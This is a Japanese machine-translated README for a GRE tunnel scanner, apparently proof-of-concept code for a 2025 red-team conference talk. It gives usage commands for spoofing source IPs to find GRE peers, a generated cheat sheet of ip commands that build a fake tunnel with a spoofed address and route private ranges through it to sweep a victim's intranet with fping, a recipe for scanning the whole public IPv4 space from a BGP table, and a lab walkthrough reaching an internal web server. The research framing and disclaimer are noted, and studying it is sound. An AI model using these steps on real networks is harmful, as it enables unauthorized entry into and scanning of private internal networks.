# GREトンネルスキャナー
## ⚠️⚠️⚠️ 重要 ⚠️⚠️⚠️
### ⚠️このツールは送信元IPアドレスの偽装を含みます。使用には法的な許可があることを必ず確認してください。⚠️
## 参考
- これはトークのPoCコードです：From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion
    - [Black Hat USA 2025 ブリーフィング](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 メインステージ](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## 準備
- `pip3 install requirement.txt`
## 使い方
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## 例
- 例えば `1.1.1.1` と `2.2.2.2` はGREトンネルを持ち、あなたは `3.3.3.3` です
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- そしてGREトンネルの悪用方法を理解する
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
- エンドポイントは分かっているがピアアドレスが分からない場合は、次のようにできます
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`
  - 正しいピアが得られつつ、8.8.8.8からの応答が得られます

- デフォルト設定は約500パケット/秒です。
## オプション
- `-sch`: チートシートを表示して終了（見つけたら -i -lh -s -d を入力し、GREトンネル悪用コマンドを取得）
- `-l3`: レイヤ3トンネルインターフェース（デフォルト: False）
- `-r`: ICMP内にGREの宛先IP情報を配置（デフォルト: GREの送信元IP情報を配置）
- `-ss`: ステータスファイルを保存・使用（前回のスキャンを再開）（デフォルト: False）
  - 大規模スキャンシステムでは「on」を推奨、時々スクリプトが停止することを防ぐ
- `-i <interface>`: パケット送信に使用するインターフェース
- `-s <ip_or_file>`: GRE送信元として使用するIPサブネットまたはIP(サブネット)リスト
- `-d <ip_or_file>`: GRE宛先として使用するIPサブネットまたはIP(サブネット)リスト
- `-L <file>`: GREピアのリストをスキャン
  - ファイルの各行は `1.1.1.1,2.2.2.2` の形式
- `-lh <ip>`: 公開インターフェース上のIP（-iインターフェースのIP）
- `-o <file>`: ログファイルパス
- `-t <float>`: GREパケット送信後の待機秒数（デフォルト: 2）
- `-T <int>`: 同時にGREパケットを送信するスレッド数（デフォルト: 255）
- `-cs <int>`: ping応答待ち開始までに送信するIP数（デフォルト: 1000）
- `-dp`: プライベートスキャン - プライベートIPのGREをスキャン（デフォルト: False）
- `-id <ip>`: ICMP内の宛先アドレス（デフォルト: GRE宛先と同じ）
  - 内部イントラネットアドレスが分かっている場合に使用
- `-v <log_level>`: ログレベル `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']`（デフォルト: INFO）
  - GREピア発見ログは `CRITICAL` レベルで出力

## 公開IP全域をスキャンするより良い方法


```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```

## ラボ
### デモ動画
- [Youtube](https://youtu.be/DDvfYl5-J28)
### GREトンネルのスキャン
`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`
### 社内ネットワークへのアクセスとスキャン
```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```

## 免責事項
このプロジェクトは教育および研究目的のみに使用されます。このコードに関連するあらゆる行為および活動は、全て利用者の責任です。著者および寄稿者は、本プロジェクトの誤用や損害について一切責任を負いません。テスト、使用、または本コードのいかなる部分を環境で展開する前に、適切な許可があることを必ず確認してください。無許可の使用は、地域、州、連邦の法律に違反する可能性があります。

## ライセンス
本プロジェクトはMITライセンスの条件のもとでライセンスされています。



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---